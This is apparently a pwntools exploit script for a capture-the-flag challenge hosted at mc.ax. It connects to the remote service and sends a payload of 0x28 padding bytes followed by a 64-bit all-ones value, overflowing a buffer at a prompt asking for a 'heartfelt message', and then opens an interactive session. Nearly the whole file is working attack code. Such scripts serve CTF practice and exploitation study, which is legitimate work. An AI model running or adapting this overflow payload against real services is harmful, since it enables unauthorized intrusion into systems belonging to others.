\#!usr/bin/env python 
# -*- coding: utf-8 -*-
from pwn import  *
from easyLibc import *
context(arch='amd64',endian='el',os='linux')
context.log_level = 'debug'
debug = 2
if debug == 1:
	p = process("./chall")
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
	p = remote("mc.ax",31199)
	# libc = ELF("./libc.so.6",checksec=False)

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./chall",checksec=False)

pd = 'a'*(0x30 - 8)
pd += p64(0xFFFFFFFFFFFFFFFF)

sla("can you write me a heartfelt message to cheer me up? :(\n",pd)
ti()
